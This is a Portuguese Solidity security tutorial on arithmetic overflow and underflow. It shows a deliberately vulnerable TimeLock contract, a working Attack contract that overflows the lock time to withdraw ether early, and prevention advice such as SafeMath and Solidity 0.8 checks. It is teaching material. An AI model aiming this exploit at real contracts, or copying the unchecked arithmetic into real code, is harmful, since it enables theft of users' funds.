# Overflow e Underflow Aritméticos

</h4><a href="#vulnerability" id="vulnerability">Vulnerabilidade</a></h4>

**Solidity < 0.8**

Números inteiros no Solidity overflow / underflow sem nenhum erro

**Solidity >= 0.8**

O comportamento padrão do Solidity **>= 0.8** para overflow / underflow é lançar um erro.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// Este contrato é designado para atuar como um cofre temporário.
// O usuário pode depositar nesse contrato mas não pode retirar por pelo menos 1 semana.
// O usuário também pode estender o tempo de espera além do período de 1 semana.

/*
1. Implemente TimeLock
2. Implemente Attack com endereço do TimeLock
3. Chame Attack.attack enviando 1 ether. Você será capaz de retirar
   seu ether imediatamente.

O que aconteceu?
Attack causou overflow do TimeLock.lockTime e foi capaz de retirar
antes do período de 1 semana.
*/

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        se t = tempo de bloqueio atual então precisamos encontrar x tal que
        x + t = 2**256 = 0
        então x = -t
        2**256 = type(uint).max + 1
        então x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
```

</h4><a href="#preventative-techniques" id="preventative-techniques">Técnicas preventivas</a></h4>

- Use [SafeMath](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol) para evitar overflow e underflow
- Solidity 0.8 tem como padrão lançar um erro para overflow / underflow

## Teste no Remix

- [Overflow.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuNy42OwoKLy8gRXN0ZSBjb250cmF0byBlIGRlc2lnbmFkbyBwYXJhIGF0dWFyIGNvbW8gdW0gY29mcmUgdGVtcG9yYXJpby4KLy8gTyB1c3VhcmlvIHBvZGUgZGVwb3NpdGFyIG5lc3NlIGNvbnRyYXRvIG1hcyBuYW8gcG9kZSByZXRpcmFyIHBvciBwZWxvIG1lbm9zIDEgc2VtYW5hLgovLyBPIHVzdWFyaW8gdGFtYmVtIHBvZGUgZXN0ZW5kZXIgbyB0ZW1wbyBkZSBlc3BlcmEgYWxlbSBkbyBwZXJpb2RvIGRlIDEgc2VtYW5hLgoKLyoKMS4gSW1wbGVtZW50ZSBUaW1lTG9jawoyLiBJbXBsZW1lbnRlIEF0dGFjayBjb20gZW5kZXJlY28gZG8gVGltZUxvY2sKMy4gQ2hhbWUgQXR0YWNrLmF0dGFjayBlbnZpYW5kbyAxIGV0aGVyLiBWb2NlIHNlcmEgY2FwYXogZGUgcmV0aXJhciAKICAgc2V1IGV0aGVyIGltZWRpYXRhbWVudGUuCgpPIHF1ZSBhY29udGVjZXU/CkF0dGFjayBjYXVzb3Ugb3ZlcmZsb3cgZG8gVGltZUxvY2subG9ja1RpbWUgZSBmb2kgY2FwYXogZGUgcmV0aXJhcgphbnRlcyBkbyBwZXJpb2RvIGRlIDEgc2VtYW5hLgoqLwoKY29udHJhY3QgVGltZUxvY2sgewogICAgbWFwcGluZyhhZGRyZXNzID0+IHVpbnQpIHB1YmxpYyBiYWxhbmNlczsKICAgIG1hcHBpbmcoYWRkcmVzcyA9PiB1aW50KSBwdWJsaWMgbG9ja1RpbWU7CgogICAgZnVuY3Rpb24gZGVwb3NpdCgpIGV4dGVybmFsIHBheWFibGUgewogICAgICAgIGJhbGFuY2VzW21zZy5zZW5kZXJdICs9IG1zZy52YWx1ZTsKICAgICAgICBsb2NrVGltZVttc2cuc2VuZGVyXSA9IGJsb2NrLnRpbWVzdGFtcCArIDEgd2Vla3M7CiAgICB9CgogICAgZnVuY3Rpb24gaW5jcmVhc2VMb2NrVGltZSh1aW50IF9zZWNvbmRzVG9JbmNyZWFzZSkgcHVibGljIHsKICAgICAgICBsb2NrVGltZVttc2cuc2VuZGVyXSArPSBfc2Vjb25kc1RvSW5jcmVhc2U7CiAgICB9CgogICAgZnVuY3Rpb24gd2l0aGRyYXcoKSBwdWJsaWMgewogICAgICAgIHJlcXVpcmUoYmFsYW5jZXNbbXNnLnNlbmRlcl0gPiAwLCAiSW5zdWZmaWNpZW50IGZ1bmRzIik7CiAgICAgICAgcmVxdWlyZShibG9jay50aW1lc3RhbXAgPiBsb2NrVGltZVttc2cuc2VuZGVyXSwgIkxvY2sgdGltZSBub3QgZXhwaXJlZCIpOwoKICAgICAgICB1aW50IGFtb3VudCA9IGJhbGFuY2VzW21zZy5zZW5kZXJdOwogICAgICAgIGJhbGFuY2VzW21zZy5zZW5kZXJdID0gMDsKCiAgICAgICAgKGJvb2wgc2VudCwgKSA9IG1zZy5zZW5kZXIuY2FsbHt2YWx1ZTogYW1vdW50fSgiIik7CiAgICAgICAgcmVxdWlyZShzZW50LCAiRmFpbGVkIHRvIHNlbmQgRXRoZXIiKTsKICAgIH0KfQoKY29udHJhY3QgQXR0YWNrIHsKICAgIFRpbWVMb2NrIHRpbWVMb2NrOwoKICAgIGNvbnN0cnVjdG9yKFRpbWVMb2NrIF90aW1lTG9jaykgewogICAgICAgIHRpbWVMb2NrID0gVGltZUxvY2soX3RpbWVMb2NrKTsKICAgIH0KCiAgICBmYWxsYmFjaygpIGV4dGVybmFsIHBheWFibGUge30KCiAgICBmdW5jdGlvbiBhdHRhY2soKSBwdWJsaWMgcGF5YWJsZSB7CiAgICAgICAgdGltZUxvY2suZGVwb3NpdHt2YWx1ZTogbXNnLnZhbHVlfSgpOwogICAgICAgIC8qCiAgICAgICAgc2UgdCA9IHRlbXBvIGRlIGJsb3F1ZWlvIGF0dWFsIGVudGFvIHByZWNpc2Ftb3MgZW5jb250cmFyIHggdGFsIHF1ZQogICAgICAgIHggKyB0ID0gMioqMjU2ID0gMAogICAgICAgIGVudGFvIHggPSAtdAogICAgICAgIDIqKjI1NiA9IHR5cGUodWludCkubWF4ICsgMQogICAgICAgIGVudGFvIHggPSB0eXBlKHVpbnQpLm1heCArIDEgLSB0CiAgICAgICAgKi8KICAgICAgICB0aW1lTG9jay5pbmNyZWFzZUxvY2tUaW1lKAogICAgICAgICAgICB0eXBlKHVpbnQpLm1heCArIDEgLSB0aW1lTG9jay5sb2NrVGltZShhZGRyZXNzKHRoaXMpKQogICAgICAgICk7CiAgICAgICAgdGltZUxvY2sud2l0aGRyYXcoKTsKICAgIH0KfQ==&version=soljson-v0.7.6+commit.7338295f.js)
